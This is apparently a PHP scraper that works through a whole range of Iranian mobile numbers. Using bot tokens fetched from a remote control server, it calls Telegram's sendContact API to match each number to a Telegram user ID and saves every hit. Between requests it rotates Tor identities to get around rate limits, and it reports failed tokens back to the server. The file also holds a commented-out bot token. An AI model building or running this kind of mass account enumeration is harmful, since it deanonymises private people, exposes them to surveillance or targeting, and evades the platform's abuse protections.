<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set("log_errors", 1);
date_default_timezone_set('Asia/Tehran');
error_reporting(E_ALL);

require_once('Core.php');

class ScanComponent extends Core{

  	public $DataCenter  = "http://tgl.webts.ir/tgl/bot_telegram/get_tokens";
  	public $ReportUrl  = "http://tgl.webts.ir/tgl/bot_telegram/reports";
  	public $data;
	public $token;
	public $phone;
	public $chatId;
	public $ErrorTokens;

  	//public $perfix 		98935;
  	public $basestartNumber = 390000000;
  	public $startNumber ;
  	public $endNumber		= 399999999;
	
	public function __construct(){
		parent::__construct();
		$this->Initialize();
	}

	public function Initialize(){
		$SelectEvent=$this->Select('event');
		if($SelectEvent){
			$this->startNumber=$SelectEvent["mobile"];
		}
		else{

			$Row = array('id' => null,'mobile' => $this->basestartNumber);
			$insert = $this->Insert('event', $Row);
			$this->Initialize();
		}
	}

	public function ReportErrorToken(){

		$content['Tokens']= $this->ErrorTokens;
		$content['Message']= "Ready";
		$content['IP']= $_SERVER['SERVER_ADDR'];
		$this->data = $this->RequestToServer($this->ReportUrl ,$content);
		die();
		return ;
	}

	public function GetListToken() {

		$content['IP']= $_SERVER['SERVER_ADDR'];
		$this->data = $this->RequestToServer($this->DataCenter ,$content);
        $this->SendContact();
        return ;
	}

	public function UpdateLastNumber($number){
			$Row['mobile']= $number;
			$Update = $this->Update('event', $Row,'`id`');
	}

	public function SelectToken(){
		if(count($this->data)){
			return array_shift($this->data);
		}else{
			$this->SetLog("End cycle ","",2);
			$this->ReportErrorToken();
		}
	}

	private function SendContact(){
		if(!isset($this->data) OR !$this->data){
		    $this->Response(False,'Task Not Resive');
		}
	
		for ($i = $this->startNumber ; $i < $this->endNumber ; $i++ ) {
			
			$status = $this->SendRequetToTelegram($i);
			if($status==false){
				$i-- ;
			}

			$this->UpdateLastNumber($i);
  		}
	}

	public function SendRequetToTelegram($mobileNumber){

			$Item=$this->SelectToken();
			$this->token = $Item['field_token_value'];
			$this->phone = $mobileNumber;
			$data = array(
		        'chat_id' => urlencode($Item['field_chatid_value']),
		        'phone_number' => urlencode("989".$mobileNumber),
		        'first_name' => urlencode(rand(0,4000)),
			 );
			$this->chatId=$data['chat_id'];
	
			$url = "https://api.telegram.org/bot".trim($this->token)."/sendContact";
			//$url = "https://api.telegram.org/bot506115971:AAFrB2QKAgm2iMxccjSFJOIad_IbAkd6n90/sendContact";
			$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, count($data));
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			if(fmod(count($this->data),5)/2==0){
				$this->tor_new_identity();
				$this->SaveIp();
				curl_setopt($ch, CURLOPT_PROXY,'http://localhost:9050'); 
				curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
			}

			$result = curl_exec($ch);

			//$sent_request = curl_getinfo($ch);

			if(curl_error($ch)){
				$this->SetLog(url_error($ch),$this->token,6);
			}
			curl_close($ch);
			return ($this->CheckValue($result));
	}

	public function CheckValue($result){
		
		$decodevalue=$this->json_validate($result);
			if(isset($decodevalue->ok) && $decodevalue->ok){
				if(isset($decodevalue->result->contact->user_id)){
					$Data['uid']= $decodevalue->result->contact->user_id;
					$Data['mobile']= $decodevalue->result->contact->phone_number;
    				$insert = $this->Insert('users',$Data);
    				$this->SetLog("AddMobile",$Data['mobile'],3);
    				return true ;
				}else{
					$this->SetLog("Not",$decodevalue->result->contact->phone_number,4);
					return true ;
				}
			}else{
				$this->CheakErrorCode($decodevalue);
				return false ;
			}

	}


	public function CheakErrorCode($decodevalue){

		if($decodevalue->error_code){
			switch ($decodevalue->error_code) {
			 	case 429:
			 		$this->SetLog($decodevalue->description,$this->token,7);
			 		$int = filter_var($decodevalue->description, FILTER_SANITIZE_NUMBER_INT);
			 		$this->ErrorTokens[] = array("Token"=>$this->token , "Error"=>$decodevalue->description , "Limit"=>$int);
			 		break;
			 	case 401:
			 		$this->SetLog($decodevalue->description,$this->token,5);
			 		$this->ErrorTokens[] = array("Token"=>$this->token , "Error"=>$decodevalue->description);
			 		break;
			 	case 400:
			 		$this->SetLog($decodevalue->description,$this->token,1);
			 		$this->ErrorTokens[] = array("Token"=>$this->token , "Error"=>$decodevalue->description);
			 		break;
			 	default:
			 		
			 		$this->SetLog($this->token,$decodevalue->error_code,111);
			 		$this->ErrorTokens[] = array("Token"=>$this->token , "Error"=>$decodevalue->description);
			 		break;
			}
		}else{
			$this->SetLog($this->token,$decodevalue->error_code,222);
		}
		 

	}

	public function tor_new_identity(){
		//TODO : save error tor 
			$fp = fsockopen('127.0.0.1', 9051, $errno, $errstr, 30);
			$auth_code = 'passwordhere';
			fputs($fp, "AUTHENTICATE \"".$auth_code."\"\r\n");
			$response = fread($fp, 1024);
			list($code, $text) = explode(' ', $response, 2);
			fputs($fp, "SIGNAL NEWNYM\r\n");
			$response = fread($fp, 1024);
			list($code, $text) = explode(' ', $response, 2);
			fclose($fp);
		}

	public function SaveIp(){
		$url = "https://api.ipify.org/?format=json";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_PROXY,'http://localhost:9050'); 
		curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
		$result = curl_exec($ch);
		curl_close($ch);
		$Data['id']= null;
		$Data['ip']= $result;
		$insert = $this->Insert('ip',$Data);
		}

	public function json_validate($string)
	{
	    // decode the JSON data
	    $result = json_decode($string);
	    switch (json_last_error()) {
	        case JSON_ERROR_NONE:
	            $error = ''; // JSON is valid // No error has occurred
	            break;
	        case JSON_ERROR_DEPTH:
	            $error = 'The maximum stack depth has been exceeded.';
	            break;
	        case JSON_ERROR_STATE_MISMATCH:
	            $error = 'Invalid or malformed JSON.';
	            break;
	        case JSON_ERROR_CTRL_CHAR:
	            $error = 'Control character error, possibly incorrectly encoded.';
	            break;
	        case JSON_ERROR_SYNTAX:
	            $error = 'Syntax error, malformed JSON.';
	            break;
	        // PHP >= 5.3.3
	        case JSON_ERROR_UTF8:
	            $error = 'Malformed UTF-8 characters, possibly incorrectly encoded.';
	            break;
	        // PHP >= 5.5.0
	        case JSON_ERROR_RECURSION:
	            $error = 'One or more recursive references in the value to be encoded.';
	            break;
	        // PHP >= 5.5.0
	        case JSON_ERROR_INF_OR_NAN:
	            $error = 'One or more NAN or INF values in the value to be encoded.';
	            break;
	        case JSON_ERROR_UNSUPPORTED_TYPE:
	            $error = 'A value of a type that cannot be encoded was given.';
	            break;
	        default:
	            $error = 'Unknown JSON error occured.';
	            break;
	    }

	    if ($error !== '') {
	        $this->SetLog("json Erro","",5);
	    }

	    // everything is OK
	    return $result;
	}
  public function Start(){
  	if(isset($this->data->Task) AND $this->data->Task=="Start"){
			$this->GetListToken();
	}else{
			$this->Response(False , 'Action Not Found');
	}
  }
  public function Stop(){
  	if(isset($this->data->Task) AND $this->data->Task=="Stop") {
  		parent::RemovePid();

	}else{
			$this->Response(False , 'Action Not Found');

	}
  }

}

?>	